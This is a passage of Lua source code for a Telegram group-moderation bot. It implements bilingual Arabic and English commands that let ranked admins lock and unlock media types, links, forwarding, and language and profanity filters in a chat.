faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:webpage:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ webpage is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الشبكات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "arabic" or mutepts[2] == "العربيه" then
if not botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock arabic ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل العربيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:arabic:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ arabic is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل العربيه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "english" or mutepts[2] == "الانكليزيه" then
if not botx1:get(BOT..'bot:english:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '??⁞ Has been lock english ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الانكليزيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 60, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:english:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ english is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الانكليزيه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "sticker" or mutepts[2] == "الملصقات" then
if not botx1:get(BOT..'bot:sticker:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock sticker ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الملصقات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:sticker:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ sticker is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الملصقات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "markdown" or mutepts[2] == "الماركداون" then
if not botx1:get(BOT..'markdown:lock'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock markdown ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الماركداون • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 60, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'markdown:lock'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ markdown is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الماركداون سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "tgservice" or mutepts[2] == "وو" then
if not botx1:get(BOT..'bot:tgservice:jk'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock tgservice ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الاشعارات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 59, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:tgservice:jk'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tgserice is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الاشعارات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "fwd" or mutepts[2] == "التوجيه" then
if not botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock fwd ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التوجيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:forward:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ fwd is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التوجيه سابقا ✔️', 1, 'md')
end
end
end
end
end
if text == 'قفل الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الفشار • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 56, string.len(msg.sender_user_id_))
botx1:del(BOT.."fshar"..msg.chat_id_)
end
if text == 'فتح الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الفشار • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 56, string.len(msg.sender_user_id_))
botx1:set(BOT.."fshar"..msg.chat_id_, true)
end
if text == 'قفل الفارسيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الفارسيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
botx1:del(BOT.."farsi"..msg.chat_id_)
end
if text == 'فتح الفارسيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الفارسيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
botx1:set(BOT.."farsi"..msg.chat_id_, true)
end
if text == 'قفل الطائفيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الطائفيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
botx1:del(BOT.."taf"..msg.chat_id_)
end
if text == 'فتح الطائفيه' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الطائفيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
botx1:set(BOT.."taf"..msg.chat_id_, true)
end
if text == 'قفل الكفران' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الكفران • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
botx1:del(BOT.."kaf"..msg.chat_id_)
end
if text == 'فتح الكفران' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الكفران • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
botx1:set(BOT.."kaf"..msg.chat_id_, true)
end
-------------------------------------bot----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
local unmutept = {string.match(text, "^([Uu]nlock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutept[2] == "all" or unmutepts[2] == "الكل" or unmutepts[2] == "الكل بالساعات" then
if botx1:get(BOT..'bot:text:mute'..msg.chat_id_) and botx1:get(BOT..'bot:inline:mute'..msg.chat_id_) and botx1:get(BOT..'bot:photo:mute'..msg.chat_id_) and botx1:get(BOT..'bot:spam:mute'..msg.chat_id_) and botx1:get(BOT..'bot:video:mute'..msg.chat_id_) and botx1:get(BOT..'bot:gifs:mute'..msg.chat_id_) and botx1:get(BOT..'bot:music:mute'..msg.chat_id_) and botx1:get(BOT..'bot:voice:mute'..msg.chat_id_) and botx1:get(BOT..'bot:links:mute'..msg.chat_id_) and botx1:get(BOT..'bot:location:mute'..msg.chat_id_) and botx1:get(BOT..'tags:lock'..msg.chat_id_) and botx1:get(BOT..'bot:strict'..msg.chat_id_) and botx1:get(BOT..'bot:document:mute'..msg.chat_id_) and botx1:get(BOT..'bot:hashtag:mute'..msg.chat_id_) and botx1:get(BOT..'bot:contact:mute'..msg.chat_id_) and botx1:get(BOT..'bot:webpage:mute'..msg.chat_id_) and botx1:get(BOT..'bot:arabic:mute'..msg.chat_id_) and botx1:get(BOT..'bot:english:mute'..msg.chat_id_) and botx1:get(BOT..'bot:sticker:mute'..msg.chat_id_) and botx1:get(BOT..'markdown:lock'..msg.chat_id_) and botx1:get(BOT..'bot:forward:mute'..msg.chat_id_) and botx1:get(BOT..'editmsg'..msg.chat_id_) and botx1:get(BOT..'bot:cmds'..msg.chat_id_) and botx1:get(BOT..'bot:bots:mute'..msg.chat_id_) and botx1:get(BOT..'bot:bots:ban'..msg.chat_id_) and botx1:get(BOT..'keed_bots'..msg.chat_id_) and botx1:get(BOT..'anti-flood:'..msg.chat_id_) and botx1:get(BOT..'bot:pin:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock all ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح كل الوسائط • \n🎖⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 60, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'editmsg'..msg.chat_id_)
botx1:del(BOT..'bot:cmds'..msg.chat_id_)
botx1:del(BOT..'bot:bots:mute'..msg.chat_id_)
botx1:del(BOT..'bot:bots:ban'..msg.chat_id_)
botx1:del(BOT..'keed_bots'..msg.chat_id_)
botx1:del(BOT..'anti-flood:'..msg.chat_id_)
botx1:del(BOT..'bot:pin:mute'..msg.chat_id_)
botx1:del(BOT..'bot:text:mute'..msg.chat_id_)
botx1:del(BOT..'bot:photo:mute'..msg.chat_id_)
botx1:del(BOT..'bot:spam:mute'..msg.chat_id_)
botx1:del(BOT..'bot:video:mute'..msg.chat_id_)
botx1:del(BOT..'bot:document:mute'..msg.chat_id_)
botx1:del(BOT..'bot:inline:mute'..msg.chat_id_)
botx1:del(BOT..'markdown:lock'..msg.chat_id_)
botx1:del(BOT..'bot:gifs:mute'..msg.chat_id_)
botx1:del(BOT..'bot:music:mute'..msg.chat_id_)
botx1:del(BOT..'bot:voice:mute'..msg.chat_id_)
botx1:del(BOT..'bot:links:mute'..msg.chat_id_)
botx1:del(BOT..'bot:location:mute'..msg.chat_id_)
botx1:del(BOT..'tags:lock'..msg.chat_id_)
botx1:del(BOT..'bot:strict'..msg.chat_id_)
botx1:del(BOT..'bot:hashtag:mute'..msg.chat_id_)
botx1:del(BOT..'bot:contact:mute'..msg.chat_id_)
botx1:del(BOT..'bot:webpage:mute'..msg.chat_id_)
botx1:del(BOT..'bot:arabic:mute'..msg.chat_id_)
botx1:del(BOT..'bot:english:mute'..msg.chat_id_)
botx1:del(BOT..'bot:sticker:mute'..msg.chat_id_)
botx1:del(BOT..'bot:forward:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ all is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح كل الوسائط سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "text" or unmutepts[2] == "الدردشه" then
if botx1:get(BOT..'bot:text:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock text ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الدردشه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:text:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ text is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الدردشه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "photo" or unmutepts[2] == "الصور" then
if botx1:get(BOT..'bot:photo:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock photo ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الصور • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 55, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:photo:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ photo is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الصور سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "spam" or unmutepts[2] == "الكلايش" then
if botx1:get(BOT..'bot:spam:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock spam ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الكلايش • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:spam:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ spam is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الكلايش سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "video" or unmutepts[2] == "الفيديو" then
if botx1:get(BOT..'bot:video:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock video ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الفيديو • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:video:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '??⁞ video is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الفيديو سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "file" or unmutepts[2] == "الملفات" then
if botx1:get(BOT..'bot:document:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock file ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الملفات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:document:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ file is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الملفات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "inline" or unmutepts[2] == "الاونلاين" then
if botx1:get(BOT..'bot:inline:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock inline ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الاونلاين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 59, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:inline:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ inline is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الاونلاين سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "markdown" or unmutepts[2] == "الماركداون" then
if botx1:get(BOT..'markdown:lock'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock markdown ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الماركداون • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 60, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'markdown:lock'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ markdown is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الماركداون سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "gif" or unmutepts[2] == "المتحركه" then
if botx1:get(BOT..'bot:gifs:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock gif ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح المتحركه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 58, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:gifs:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ gif is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح المتحركه سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "music" or unmutepts[2] == "الاغاني" then
if botx1:get(BOT..'bot:music:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock music ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الاغاني • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:music:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ music is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الاغاني سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "voice" or unmutepts[2] == "الصوت" then
if botx1:get(BOT..'bot:voice:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock voice ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الصوت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 55, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:voice:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ voice is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الصوت سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "links" or unmutepts[2] == "الروابط" then
if botx1:get(BOT..'bot:links:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock links ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الروابط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:del(BOT..'bot:links:mute'..msg.chat_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ links is already unlocked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الروابط سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "location" or unmutepts[2] == "المواقع" then
if botx1:get(BOT..'bot:location:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock location ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح المواقع • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
